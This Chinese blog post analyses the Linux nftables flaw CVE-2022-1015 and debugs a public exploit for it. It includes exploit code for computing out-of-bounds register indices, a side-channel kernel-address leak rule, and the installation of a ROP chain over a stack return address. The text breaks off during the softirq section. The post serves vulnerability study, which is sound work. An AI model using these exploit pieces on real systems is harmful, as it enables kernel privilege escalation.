    <content type="html"><![CDATA[<p>咕咕咕，重启kernel</p><span id="more"></span><ul><li><strong>影响版本</strong>：5.12~5.17</li><li>利用条件：CAP_NET_ADMIN</li></ul><p>参考：<a href="https://bsauce.github.io/2022/07/16/CVE-2022-1015/#kernel-exploitcve-2022-1015-nftables-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">【kernel exploit】CVE-2022-1015 nftables 栈溢出漏洞分析与利用</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="nft-regs"><a href="#nft-regs" class="headerlink" title="nft_regs"></a>nft_regs</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_regs</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[NFT_REG32_NUM];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>参考下图，1个verdict，4个NFT_REG：</p><img src="/2024/08/23/cve-2022-1015/regs.png" class title="regs"><ul><li>nftables最开始使用 <strong>16bytes verdict</strong> + <strong>4</strong> x <strong>16bytes data reg</strong>，序号对应枚举 <strong>0 ~ 4</strong></li><li>后来使用 <strong>16bytes verdict</strong> + <strong>16</strong> x <strong>4bytes data reg</strong>，序号对应枚举 <strong>8 ~ 23</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_registers</span> &#123;</span><br>NFT_REG_VERDICT,<br>NFT_REG_1,<br>NFT_REG_2,<br>NFT_REG_3,<br>NFT_REG_4,<br>__NFT_REG_MAX,<br><br>NFT_REG32_00= <span class="hljs-number">8</span>,<br>NFT_REG32_01,<br>NFT_REG32_02,<br>NFT_REG32_03,<br>NFT_REG32_04,<br>NFT_REG32_05,<br>NFT_REG32_06,<br>NFT_REG32_07,<br>NFT_REG32_08,<br>NFT_REG32_09,<br>NFT_REG32_10,<br>NFT_REG32_11,<br>NFT_REG32_12,<br>NFT_REG32_13,<br>NFT_REG32_14,<br>NFT_REG32_15,<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="nft-parse-register"><a href="#nft-parse-register" class="headerlink" title="nft_parse_register"></a>nft_parse_register</h2><p>翻译寄存器下标</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> reg;<br><br>reg = ntohl(nla_get_be32(attr));<br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT...NFT_REG_4:<span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">return</span> reg * NFT_REG_SIZE / NFT_REG32_SIZE;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;  <span class="hljs-comment">// [2]</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>使用NFT_REG：一个reg <strong>4 x 4bytes</strong></li><li>使用NFT_REG32：<ul><li>verdict依然使用NFT_REG_VVERDICT即 <strong>0</strong>，占用 <strong>16bytes &#x2F; 4</strong> 个下标</li><li>NFT_REG32从NFT_REG32_00开始编号</li></ul></li></ul><h2 id="nft-parse-register-load"><a href="#nft-parse-register-load" class="headerlink" title="nft_parse_register_load"></a>nft_parse_register_load</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_load</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *sreg, u32 len)</span><br>&#123;<br>u32 reg;<br><span class="hljs-type">int</span> err;<br><br>reg = nft_parse_register(attr);<span class="hljs-comment">// [1]</span><br>err = nft_validate_register_load(reg, len); <span class="hljs-comment">// [2]</span><br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*sreg = reg;  <span class="hljs-comment">// [3]</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_load);<br></code></pre></td></tr></table></figure><ul><li>nft_parse_register获取reg（下标）</li><li>nft_validate_register_load检验下标合法性</li><li>reg放入*sreg返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> nft_registers reg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<span class="hljs-comment">// [1]</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>) <span class="hljs-comment">// [2]</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))  <span class="hljs-comment">// [3]</span><br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>reg不能为verdict</li><li>len不能为0</li><li><strong>4 x reg + len</strong> 不能超过nft_regs.data的范围（0x50）</li></ul><p>nft_parse_register_store基本同理</p><h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><ul><li><p>经过nft_parse_register后，reg的范围：</p><ul><li>NFT_REG：**{ 0, 4, 8, 12, 16 }**</li><li>NFT_REG32：**[ 1, 0xfffffffb ]**</li></ul></li><li><p>nft_validate_register_load检查：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data)) <span class="hljs-comment">// 0x50</span><br><span class="hljs-keyword">return</span> -ERANGE;<br></code></pre></td></tr></table></figure><p>reg形如 <strong>{ 0x3f, 0x7f, 0xff } . ffffff . [ 0, 0xfb ]</strong> 时会导致溢出，举例 <strong>reg &#x3D; 0xfffffff0, len &#x3D; 0x40</strong></p><ul><li>x4：<strong>0xffffffc0</strong></li><li>+len：<strong>0</strong></li><li>通过检查</li></ul></li><li><p>nft_parse_register_load最终返回：</p><ul><li><strong>*sreg &#x3D; 0xf0</strong></li><li><strong>len &#x3D; 0x40</strong></li></ul><p>造成越界</p></li></ul><h3 id="nft-bitwise"><a href="#nft-bitwise" class="headerlink" title="nft_bitwise"></a>nft_bitwise</h3><ul><li>（实际）0x40字节</li></ul><p>寄存器范围：</p><ul><li>low：<strong>0x7ffffff0 x 4 &#x3D; 0xffffffc0</strong>，写入sreg最低字节 <strong>0xf0</strong>（0xffffffc0 + 0x40 &#x3D; 0 可通过validate检查）</li><li>high：<strong>0x7ffffffb x 4 &#x3D; 0xffffffec</strong>，写入sreg最低字节 <strong>0xfb</strong></li></ul><p>由下标转化为偏移：</p><ul><li>low：<strong>0xf0 x 4 &#x3D; 0x3c0</strong></li><li>high：<strong>0xfb x 4 + 0x40 &#x3D; 0x42c</strong></li></ul><p>实际范围：**[ 0x3c0, 0x42c ] bytes**</p><h3 id="nft-payload"><a href="#nft-payload" class="headerlink" title="nft_payload"></a>nft_payload</h3><ul><li>0xff字节</li></ul><p>寄存器范围：</p><ul><li>low：<strong>0x7fffffc1 x 4 &#x3D; 0xffffff04</strong>，写入sreg最低字节 <strong>0xc1</strong>（0xffffff04 + 0xff &#x3D; 3 可通过validate检查）</li><li>high：<strong>0x7fffffd4 x 4 &#x3D; 0xffffff50</strong>，写入sreg最低字节 <strong>0xd4</strong>（0xffffff50 + 0xff &#x3D; 0x4f 可通过validate检查）</li></ul><p>由下标转化为偏移：</p><ul><li>low：<strong>0xc1 x 4 &#x3D; 0x304</strong></li><li>high：<strong>0xd4 x 4 + 0xff &#x3D; 0x44f</strong></li></ul><p>实际范围：**[ 0x304, 0x44f ] bytes**</p><h1 id="exp调试分析"><a href="#exp调试分析" class="headerlink" title="exp调试分析"></a>exp调试分析</h1><p>来自👉<a href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2022-1015/exploit">kernel-exploit-factory</a></p><h2 id="越界范围计算"><a href="#越界范围计算" class="headerlink" title="越界范围计算"></a>越界范围计算</h2><ul><li>参数：<ul><li>result：计算结果</li><li>desired：期望idx</li><li>min_len：期望最小长度</li><li>max_len：期望最大长度</li></ul></li><li>其实就是0x3f，0x7f，0xff三种前缀</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calc_vuln_expr_params</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vuln_expr_params *result, <span class="hljs-type">uint8_t</span> desired, <span class="hljs-type">uint32_t</span> min_len, <span class="hljs-type">uint32_t</span> max_len)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i) &#123;<br>        <span class="hljs-type">int</span> res = calc_vuln_expr_params_div(result, desired, min_len, max_len, i);<br>        <span class="hljs-keyword">if</span> (!res)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>初始化reg值为最大值</li><li>计算validate<ul><li>判断是否溢出，否则break，返回错误值（再往下减就不会溢出了）</li></ul></li><li>判断低字节是否是我们想要的idx<ul><li>否则递减reg值，goto [2]</li></ul></li><li>计算要造成溢出最小的len</li><li>计算最大的len</li><li>更新len范围</li><li>更新value（+4），这是要填入的reg值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calc_vuln_expr_params_div</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vuln_expr_params* result, <span class="hljs-type">uint8_t</span> desired, <span class="hljs-type">uint32_t</span> min_len, <span class="hljs-type">uint32_t</span> max_len, <span class="hljs-type">int</span> shift)</span><br>&#123;<br>    <span class="hljs-comment">// [1]</span><br>    <span class="hljs-type">uint64_t</span> base_ = (<span class="hljs-type">uint64_t</span>)(<span class="hljs-number">1</span>) &lt;&lt; (<span class="hljs-number">32</span> - shift);<br>    <span class="hljs-type">uint32_t</span> base = (<span class="hljs-type">uint32_t</span>)(base_ - <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">if</span> (base == <span class="hljs-number">0xffffffff</span>)<br>        base = <span class="hljs-number">0xfffffffb</span>;<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-comment">// [2]</span><br>        <span class="hljs-type">uint64_t</span> computed = (base * <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xffffffff</span>;<br>        <span class="hljs-type">uint64_t</span> max_value = computed + (<span class="hljs-type">uint64_t</span>)(max_len);<br>        <span class="hljs-keyword">if</span> (max_value &lt; ((<span class="hljs-type">uint64_t</span>)(<span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">32</span>)) <br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-comment">// [3]</span><br>        <span class="hljs-keyword">if</span> ( (base &amp; <span class="hljs-number">0xff</span>) != desired) &#123; <br>            base--;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// [4]</span><br>        <span class="hljs-type">uint32_t</span> len_at_least = ((<span class="hljs-type">uint64_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>) - computed;<br>        <span class="hljs-comment">// [5]</span><br>        <span class="hljs-type">uint32_t</span> len_at_most  = len_at_least + <span class="hljs-number">0x50</span>; <br>        <br>        <span class="hljs-comment">// [6]</span><br>        <span class="hljs-keyword">if</span> (min_len &gt; len_at_least) <br>            len_at_least = min_len;<br><br>        <span class="hljs-keyword">if</span> (max_len &lt; len_at_most) <br>            len_at_most = max_len;<br><br>        result-&gt;max_len = len_at_most;<br>        result-&gt;min_len = len_at_least;<br>        <span class="hljs-comment">// [7]</span><br>        result-&gt;value = base + <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nftables规则建立"><a href="#nftables规则建立" class="headerlink" title="nftables规则建立"></a>nftables规则建立</h2><ul><li><p>table：</p><ul><li>exploit_table：inet</li></ul></li><li><p>chain：</p><ul><li>base_chain：output，NFPROTO_IPV4</li><li>aux_chain：output，NFPROTO_IPV4</li></ul></li><li><p>rules：</p><ul><li><p>base_chain：</p><table><thead><tr><th>Expression</th><th>Aguments</th><th>Comment</th></tr></thead><tbody><tr><td>payload</td><td>base &#x3D; NFT_PAYLOAD_TRANSPORT_HEADER</td><td>将packet目标端口写到reg 8</td></tr><tr><td></td><td>offset &#x3D; offsetof(udphdr, dport)</td><td></td></tr><tr><td></td><td>len &#x3D; sizeof_field(udphdr, dport)</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_EQ</td><td>比较reg 8是否为9999</td></tr><tr><td></td><td>sreg &#x3D; 8</td><td>否则发出NFT_BREAK</td></tr><tr><td></td><td>data &#x3D; 999</td><td></td></tr><tr><td>payload</td><td>base &#x3D; NFT_PAYLOAD_INNER_HEADER</td><td>将packet前8字节写入reg 8</td></tr><tr><td></td><td>offset &#x3D; 0</td><td></td></tr><tr><td></td><td>len &#x3D; 8</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_EQ</td><td>比较reg 8是否为magic</td></tr><tr><td></td><td>sreg &#x3D; 8</td><td>否则发出NFT_BREAK</td></tr><tr><td></td><td>data &#x3D; 0xdeadbeef0badc0de</td><td></td></tr><tr><td>immediate</td><td>verdict &#x3D; NFT_JUMP</td><td>调用aux_chain</td></tr><tr><td></td><td>chain &#x3D; aux_chain</td><td></td></tr></tbody></table></li><li><p>aux_chain：</p><table><thead><tr><th>Expression</th><th>Arguments</th><th>Comment</th></tr></thead><tbody><tr><td>bitwise</td><td>op &#x3D; NFT_BITWISE_RSHIFT</td><td>利用OOB read内核地址字节</td></tr><tr><td></td><td>data &#x3D; SHIFT_AMT</td><td>移位SHIFT_AMT bits写入reg 1</td></tr><tr><td></td><td>sreg &#x3D; OOB_OFFSET</td><td></td></tr><tr><td></td><td>dreg &#x3D; 1</td><td></td></tr><tr><td>cmp</td><td>op &#x3D; NFT_CMP_GT</td><td>比较内核字节和COMPARED</td></tr><tr><td></td><td>sreg &#x3D; ADDRESS_OFFSET</td><td>小于等于COMPARED发出NFT_BREAK</td></tr><tr><td></td><td>data &#x3D; COMPARED</td><td>大于则继续</td></tr><tr><td>immediate</td><td>verdict &#x3D; NFT_DROP</td><td>drop packet</td></tr></tbody></table></li></ul></li></ul><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><ul><li><p>新建Thread B：leak_handler</p><p>监听SERVER_PORT，重复以下过程</p><ul><li>接收消息</li><li>回复MSG_OK</li></ul></li><li><p>当前Thread A：</p><p>使用CLIENT_PORT，do_leak_byte泄漏1-3字节</p><ul><li><p>二分法侧信道计算mid</p><ul><li><p>建立leak rule，对比pos是否为cmp（mid）</p><ul><li>bitwise目标数据从0x3d4（index 0xf5）开始0x40字节</li><li>bitwise右移pos x 8 bit，数据放至reg 1</li><li>对比cmp和reg 0x15，1字节，小于等于break，大于drop；计算逻辑如下：<ul><li>泄漏目标偏移0x408</li><li>将0x408 - 0x3d4 &#x3D; 0x34字节复制至reg 1</li><li>reg 1使用的是NFT_REG，实际index &#x3D; 1 x 4 &#x3D; 4</li><li>目标字节实际index：4 + 0x34 &#x2F; 4 &#x3D; 0x11</li><li>实际index 0x11使用NFT_REG32，传入的index &#x3D; 0x11 + 4 &#x3D; 0x15</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create_infoleak_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint8_t</span> cmp, <span class="hljs-type">uint8_t</span> pos, <span class="hljs-type">uint16_t</span> family, <span class="hljs-type">int</span>* seq, <span class="hljs-type">int</span> extraflags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">vuln_params</span>;</span><br><br>    <span class="hljs-comment">// [1]</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;vuln_params, <span class="hljs-number">0xf5</span>,  <span class="hljs-number">0x40</span>, <span class="hljs-number">0x40</span>)) <br>        error(<span class="hljs-string">&quot;Could not find correct params to trigger OOB read.&quot;</span>);<br><br>    <span class="hljs-comment">// [2]</span><br>    <span class="hljs-type">uint32_t</span> shift_amt = (pos * <span class="hljs-number">8</span>);<br>    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, <span class="hljs-number">1</span>, &amp;shift_amt, <span class="hljs-keyword">sizeof</span> shift_amt);<br><br>    <span class="hljs-comment">// [3]</span><br>    rule_add_cmp(r, NFT_CMP_GT, <span class="hljs-number">0x15</span>, &amp;cmp, <span class="hljs-number">1</span>);<br>    rule_add_immediate_verdict(r, NF_DROP, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// [4]</span><br>    <span class="hljs-keyword">return</span> send_batch_request(<br>        nl,<br>        NFT_MSG_NEWRULE | (NFT_TYPE_RULE &lt;&lt; <span class="hljs-number">8</span>),<br>        NLM_F_CREATE | extraflags, family, (<span class="hljs-type">void</span>**)&amp;r, seq,<br>        <span class="hljs-literal">NULL</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>client向server发送magic &#x3D; 0xdeadbeef0badc0de，触发leak rule</p></li><li><p>recv from server</p><ul><li>如果recv失败，说明发生DROP，target &gt; mid</li><li>如果收到MSG_OK，说明target &lt;&#x3D; mid</li><li>如果收到的消息不是MSG_OK，发生错误</li></ul></li></ul></li></ul></li></ul><img src="/2024/08/23/cve-2022-1015/side_channel.png" class title="side_channel"><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>nft_payload OOB write</p><h3 id="hook-input"><a href="#hook-input" class="headerlink" title="hook input"></a>hook input</h3><h4 id="ROP前"><a href="#ROP前" class="headerlink" title="ROP前"></a>ROP前</h4><ul><li><p>创建一条新的base_chain，ROP劫持的是input的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">unft_base_chain_param</span> <span class="hljs-title">bp</span>;</span><br>bp.hook_num = NF_INET_LOCAL_IN;<br>bp.prio = <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (create_chain(nl, table_name, <span class="hljs-string">&quot;base_chain_2&quot;</span>, NFPROTO_IPV4, &amp;bp, &amp;seq, <span class="hljs-literal">NULL</span>)) <br>    error(<span class="hljs-string">&quot;Failed adding second base chain&quot;</span>);<br></code></pre></td></tr></table></figure><p>触发hook时的部分调用栈</p><img src="/2024/08/23/cve-2022-1015/stack.png" class title="stack"></li><li><p>写payload规则：把ROP链写到栈上</p><ul><li><p>之前计算的payload可写范围是regs后0x304—0x44f字节</p><img src="/2024/08/23/cve-2022-1015/range.png" class title="range"></li><li><p>这里覆盖__netif_receive_skb_one_core的返回地址</p><img src="/2024/08/23/cve-2022-1015/return.png" class title="return"><img src="/2024/08/23/cve-2022-1015/change_return.png" class title="change_return"><p><em>不能从返回地址前开始连续覆盖，会破坏canary</em></p></li><li><p>目标偏移0x398，下标0xe6，计算得到的vuln_expr_params结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">$<span class="hljs-number">2</span> = &#123;<br>  min_len = <span class="hljs-number">0x68</span>,<br>  max_len = <span class="hljs-number">0xb8</span>,<br>  value = <span class="hljs-number">0xffffffea</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可写最大长度为0xb8，也就是23条gadget</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">err = install_rop_chain_rule(nl, kernel_base, <span class="hljs-string">&quot;base_chain_2&quot;</span>, &amp;seq);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) <br>    error(<span class="hljs-string">&quot;[-] Could not install ROP chain&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">install_rop_chain_rule</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mnl_socket* nl, <span class="hljs-type">uint64_t</span> kernel_base, <span class="hljs-type">char</span>* chain, <span class="hljs-type">int</span>* seq)</span><br>&#123;<br><span class="hljs-comment">// 1. return address is at regs.data[0xe6]</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vuln_expr_params</span> <span class="hljs-title">v</span>;</span><br>    <span class="hljs-keyword">if</span> (calc_vuln_expr_params(&amp;v, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xff</span>))        <span class="hljs-comment">// 0xca -&gt; 0xe6</span><br>        error(<span class="hljs-string">&quot;[-] Cannot find suitable parameters for planting ROP chain.&quot;</span>);  <br><span class="hljs-comment">// 2. write ROP chain (in the packet) at (0xca - 4)*4 = 0x318</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_rule</span>* <span class="hljs-title">r</span> =</span> build_rule(<span class="hljs-string">&quot;exploit_table&quot;</span>, chain, NFPROTO_IPV4, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);</span><br>    rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, <span class="hljs-number">8</span>, v.max_len, v.value);<br>    <br><span class="hljs-comment">/* …… */</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="ROP过程"><a href="#ROP过程" class="headerlink" title="ROP过程"></a>ROP过程</h4><h5 id="softirq"><a href="#softirq" class="headerlink" title="softirq"></a>softirq</h5><p>由于利用的是input的hook，所以触发hook时会在软中断的上下文中</p><p>先看调用栈，在ip_finish_output2中使能后半部local_bh_enable时会检查是否有未处理的软中断并进行处理</p><img src="/2024/08/23/cve-2022-1015/stack1.png" class title="stack1"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __local_bh_enable_ip(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cnt)<br>&#123;<br><span class="hljs-comment">/* …… */</span><br><span class="hljs-keyword">if</span> (unlikely(!in_interrupt() &amp;&amp; local_softirq_pending())) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Run softirq if any pending. And do it in its own stack</span><br><span class="hljs-comment"> * as we may be calling this deep in a task call stack already.</span><br><span class="hljs-comment"> */</span><br>do_softirq();<br>&#125;<br><span class="hljs-comment">/* ……  */</span><br>&#125;<br>EXPORT_SYMBOL(__local_bh_enable_ip);<br></code></pre></td></tr></table></figure><p>看看do_softirq的过程</p><ul><li><p>判断是否处于硬中断中</p><ul><li>在硬中断处理函数退出时会调用irq_exit处理软中断</li><li>或当前软中断被禁用</li></ul><p>没必要处理软中断，直接返回</p></li><li><p>保持中断寄存器的状态并禁用本地CPU的中断</p></li><li><p>取得当前CPU上__softirq_pending字段，获取本地CPU上挂起的软中断</p></li><li><p>如果当前CPU上有挂起的软中断，执行__do_softirq()来处理软中断</p></li><li><p>恢复中断寄存器的状态</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span 